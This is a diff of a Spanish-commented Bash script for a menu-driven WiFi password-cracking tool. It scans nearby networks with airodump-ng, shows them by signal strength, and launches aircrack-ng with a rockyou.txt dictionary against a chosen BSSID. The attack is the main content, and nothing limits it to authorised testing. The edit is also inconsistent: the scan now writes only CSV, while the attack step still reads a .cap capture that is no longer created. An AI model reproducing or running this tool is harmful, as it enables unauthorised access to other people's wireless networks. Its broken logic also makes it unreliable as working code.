@@ -2,9 +2,9 @@
 
 # Colores para la salida
 GREEN='\033[0;32m'
-RED='\033[0;31m'
 YELLOW='\033[0;33m'
-BLUE='\033[0;34m'
+ORANGE='\033[1;33m'
+RED='\033[0;31m'
 NC='\033[0m' # Sin color
 
 # Configuración del proyecto
@@ -14,7 +14,15 @@ PROJECT_DIR="$DOWNLOADS_DIR/$PROJECT_NAME"
 RESULTS_DIR="$PROJECT_DIR/resultados_wifi"
 DEPENDENCIES=("aircrack-ng" "xterm" "iw" "curl" "gzip" "hashcat" "dialog")
 
-# Función para verificar e instalar dependencias
+# Verificar permisos de administrador
+check_permissions() {
+    if [[ $EUID -ne 0 ]]; then
+        echo -e "${RED}Este script debe ejecutarse como administrador. Usa 'sudo'.${NC}"
+        exit 1
+    fi
+}
+
+# Instalar dependencias necesarias
 install_dependencies() {
     dialog --title "Instalación de Dependencias" --infobox "Verificando dependencias..." 8 40
     for dep in "${DEPENDENCIES[@]}"; do
@@ -29,68 +37,52 @@ install_dependencies() {
     dialog --title "Dependencias" --msgbox "Todas las dependencias están instaladas." 8 40
 }
 
-# Crear carpetas del proyecto con permisos correctos
+# Crear carpetas del proyecto
 prepare_project_directory() {
     mkdir -p "$PROJECT_DIR" "$RESULTS_DIR" 2>/dev/null
-    chmod -R 755 "$DOWNLOADS_DIR" "$PROJECT_DIR" "$RESULTS_DIR"
-    if [[ ! -w "$RESULTS_DIR" ]]; then
-        dialog --title "Error de Permisos" --msgbox "No se pueden escribir archivos en $RESULTS_DIR. Verifique los permisos." 8 40
-        exit 1
-    fi
-}
-
-# Detectar interfaz inalámbrica
-detect_wireless_interface() {
-    local interface=$(iw dev | grep Interface | awk '{print $2}' | head -n 1)
-    if [[ -z "$interface" ]]; then
-        dialog --title "Error" --msgbox "No se detectó ninguna interfaz inalámbrica. Verifique su hardware." 8 40
-        exit 1
-    fi
-    echo "$interface"
 }
 
 # Escaneo en vivo de redes WiFi
 live_scan_networks() {
     local interface=$(detect_wireless_interface)
-    dialog --title "Escaneo en Vivo" --infobox "Escaneando redes en tiempo real..." 8 40
+    if [[ -z "$interface" ]]; then
+        dialog --title "Error" --msgbox "No se detectó una interfaz inalámbrica compatible." 8 40
+        return
+    fi
 
-    sudo xterm -geometry 80x24+0+0 -hold -e "airodump-ng $interface --output-format cap --write $RESULTS_DIR/live_scan" &
+    dialog --title "Escaneo en Vivo" --infobox "Escaneando redes durante 60 segundos..." 8 40
+    xterm -geometry 80x24+0+0 -hold -e "airodump-ng $interface --output-format csv --write $RESULTS_DIR/live_scan" &
     sleep 60
-    sudo killall airodump-ng
+    killall airodump-ng
 
-    if [[ ! -f "$RESULTS_DIR/live_scan-01.cap" ]]; then
-        dialog --title "Error" --msgbox "El archivo live_scan-01.cap no se generó. Verifique los permisos y el proceso de escaneo." 8 40
-        exit 1
-    else
-        chmod 644 "$RESULTS_DIR/live_scan-01.cap"
-        dialog --title "Éxito" --msgbox "El archivo live_scan-01.cap se generó correctamente." 8 40
+    if [[ ! -f "$RESULTS_DIR/live_scan-01.csv" ]]; then
+        dialog --title "Error" --msgbox "El archivo de resultados no se generó. Verifica el proceso de escaneo." 8 40
+        return
     fi
+    show_scan_results "$RESULTS_DIR/live_scan-01.csv"
 }
 
-# Mostrar resultados del escaneo en vivo
+# Detectar interfaz inalámbrica
+
+detect_wireless_interface() {
+    iw dev | grep Interface | awk '{print $2}' | head -n 1
+}
+
+# Mostrar resultados del escaneo
 show_scan_results() {
-    local scan_file="$RESULTS_DIR/live_scan-01.cap"
-    if [[ -f "$scan_file" ]]; then
-        parse_and_display_networks "$scan_file"
-    else
-        dialog --title "Error" --msgbox "No se encontraron resultados de escaneo." 8 40
-    fi
-}
-
-# Analizar y mostrar redes encontradas
-parse_and_display_networks() {
     local scan_file=$1
     local networks=()
 
-    sudo chmod 644 "$scan_file"
     while IFS=, read -r bssid pwr beacons data mb enc cipher auth essid; do
         if [[ $bssid =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
             local color="$NC"
             if ((pwr > -30)); then
                 color="$GREEN"
             elif ((pwr > -50)); then
-                color="$YELLOW"
+                color="$ORANGE"
             elif ((pwr > -70)); then
+                color="$YELLOW"
+            else
                 color="$RED"
             fi
             networks+=("$bssid" "${color}${essid} (${pwr} dBm)${NC}")
@@ -127,7 +119,7 @@ perform_attack() {
     local dictionary=$(find_or_download_dictionary)
 
     dialog --title "Ataque" --infobox "Iniciando ataque contra $bssid..." 8 40
-    sudo xterm -geometry 80x24+0+0 -hold -e "aircrack-ng -w $dictionary -b $bssid $RESULTS_DIR/live_scan-01.cap" &
+    xterm -hold -e "aircrack-ng -w $dictionary -b $bssid $RESULTS_DIR/live_scan-01.cap" &
 }
 
 # Buscar o descargar diccionario rockyou.txt
@@ -154,7 +146,7 @@ main_menu() {
         case $option in
             1) install_dependencies ;;
             2) live_scan_networks ;;
-            3) show_scan_results "$RESULTS_DIR/live_scan-01.cap" ;;
+            3) show_scan_results "$RESULTS_DIR/live_scan-01.csv" ;;
             4) clear; exit 0 ;;
             *) dialog --title "Error" --msgbox "Opción no válida." 8 40 ;;
         esac
@@ -162,6 +154,6 @@ main_menu() {
 }
 
 # Inicio del script
-install_dependencies
+check_permissions
 prepare_project_directory
 main_menu
